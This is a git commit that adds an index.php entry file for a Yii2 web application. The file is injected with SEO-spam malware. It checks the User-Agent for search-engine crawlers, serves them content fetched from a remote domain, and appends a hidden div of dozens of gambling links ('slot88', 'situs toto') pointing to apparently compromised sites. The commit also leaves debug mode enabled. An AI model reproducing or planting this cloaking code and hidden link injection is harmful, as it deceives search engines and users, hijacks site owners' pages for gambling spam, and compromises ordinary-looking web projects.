28bc77b1766640b76b8159dd05f72b559f09a884
rokokbetwin <kalakkaro55555@gmail.com>
2025-03-05 09:36:52 +0700

    Add files via upload

---
+++ index.php
@@ -0,0 +1,84 @@
+<?php
+function is_bot() {
+    $user_agent = $_SERVER['HTTP_USER_AGENT'];
+    $bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool');
+    
+    foreach ($bots as $bot) {
+        if (stripos($user_agent, $bot) !== false) {
+            return true;
+        }
+    }
+    
+    return false;
+}
+
+if (is_bot()) {
+    $message = file_get_contents('https://kurlung.xyz/landing/pangkalpinangkota.txt');
+    echo $message;
+exit;
+}
+defined('YII_DEBUG') or define('YII_DEBUG', true);
+defined('YII_ENV') or define('YII_ENV', 'dev');
+
+require(__DIR__ . '/vendor/autoload.php');
+require(__DIR__ . '/vendor/yiisoft/yii2/Yii.php');
+require(__DIR__ . '/common/config/bootstrap.php');
+require(__DIR__ . '/frontend/config/bootstrap.php');
+
+$config = yii\helpers\ArrayHelper::merge(
+    require(__DIR__ . '/common/config/main.php'),
+    require(__DIR__ . '/common/config/main-local.php'),
+    require(__DIR__ . '/frontend/config/main.php'),
+    require(__DIR__ . '/frontend/config/main-local.php')
+);
+
+$application = new yii\web\Application($config);
+$application->run();
+?>
+<div style="display: none;">
+<p><a href="https://www.icrera.org/">slot88</a></p>
+<p><a href="https://media-ca.com/">slot gacor</a></p>
+<p><a href="https://fsf.com.fj/">slot88</a></p>
+<p><a href="https://jppa-unmul.com/">slot777</a></p>
+<p><a href="https://3d.tntu.edu.ua/">slot777</a></p>
+<p><a href="https://visnyk.tntu.edu.ua/">demo mahjong</a></p>
+<p><a href="https://visnykpau.com/">Slot88</a></p>
+<p><a href="https://www.isujournals.ph/">Situs Toto</a></p>
+<p><a href="https://www.drmair.at/">https://www.drmair.at/</a></p> 
+<p><a href="https://www.ij-ebi.com/">Situs Togel</a></p>
+<p><a href="http://e.mankopas.com/">Toto 4d</a></p>
+<p><a href="https://rocewisdomaceh.com/">https://rocewisdomaceh.com/</a></p>
+<p><a href="https://hospitalanimalprime.com.br/">situs toto</a></p>
+<p><a href="https://swjournal.az/">scatter hitam</a></p>
+<p><a href="https://sendikraf.web.id/">situs toto</a></p>
+<p><a href="https://internationaljournals.org/">situs toto</a></p>
+<p><a href="https://eduzonejournal.com/">slot88</a></p>
+<p><a href="https://www.erpublications.com/">situs toto</a></p>
+<p><a href="https://mathedu.web.id/">slot bet 200</a></p>
+<p><a href="https://jurnal.saburai.id/">situs toto</a></p>
+<p><a href="https://journal.indef.or.id/">situs toto</a></p>
+<p><a href="https://publicationmaster.com/" rel="dofollow">rokokbet</a></p>
+<p><a href="https://standupcomedy.id/" rel="dofollow">situs toto</a></p>
+<p><a href="https://www.situstotoslot.id/" rel="dofollow">situs toto slot</a></p>
+<p><a href="https://gstsuvidhakendra.org.in/" rel="dofollow">situs toto</a></p>
+<p><a href="https://www.entidadesintegradasdf.org.br/" rel="dofollow">rokokbet</a></p>
+<p><a href="https://www.redongdmad.org/" rel="dofollow">slot88</a></p>
+<p><a href="https://www.tecsi.org/">situs toto</a></p>
+<p><a href="https://hospitalanimalprime.com.br/">situs toto</a></p>
+<p><a href="https://sekupanglogistics.com/">situs toto</a></p>
+<p><a href="https://jurnalkesehatan.joln.org/">situs toto</a></p>
+<p><a href="https://www.smkn1kotabima.sch.id/">situs toto</a></p>
+<p><a href="https://fadisma.com.br/">rokokbet</a></p>
+<p><a href="https://mmriom.com/">situs toto</a></p>
+<p><a href="https://jbamsonline.org/" rel="nofollow ugc">toto4d</a></p>
+<p><a href="http://www.unbidiomas.unb.br/">slot88</a></p>
+<p><a href="https://filipebarra.com/" rel="dofollow">nono4d</a></p>
+<p><a href="https://dayboihieptam.com/">situs toto</a></p>
+<p><a href="https://www.laflotte.fr/">toto 4d</a></p>
+<p><a href="https://kindnessandcarehome.co.uk/">situs toto</a></p>
+<p><a href="https://toto808.com/">https://toto808.com/</a></p>
+<p><a href="https://darulilmiku.my.id/">live casino</a></p>
+<p><a href="https://konveksian.id/">live casino</a></p>
+<p><a href="https://www.dunyajournal.com/">live casino</a></p>
+<p><a href="https://spm-online.com/">Toto 4D</a></p>
+</div>
